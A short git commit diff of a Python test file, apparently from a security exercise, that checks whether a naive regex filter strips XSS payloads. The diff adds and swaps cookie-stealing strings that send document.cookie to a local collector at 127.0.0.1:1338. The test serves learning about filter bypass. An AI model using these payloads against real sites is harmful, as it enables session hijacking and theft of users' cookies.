6dc0f26f44020d1942123186ba819014d7081424
Ed Shao <ss5902@columbia.edu>
2019-11-10 17:19:47 -0500

    commit m

--- test.py
+++ test.py
@@ -1,6 +1,7 @@
 import re
 
-comment = '<body onload=\'document.location="http://127.0.0.1:1338/xss/high?cookie=" + document.cookie\'>'
+comment = '<body onload=\'document.location="http://127.0.0.1:1338/xss/2?cookie=" + document.cookie\'>'
+comment = '<IMG SRC="javascript:window.open(\'http://127.0.0.1:1338/xss/2?cookie=\' + document.cookie);">'
 print(comment)
 comment = re.sub(r'<[a-z]*>', '', comment, flags=re.IGNORECASE)
 print(comment)
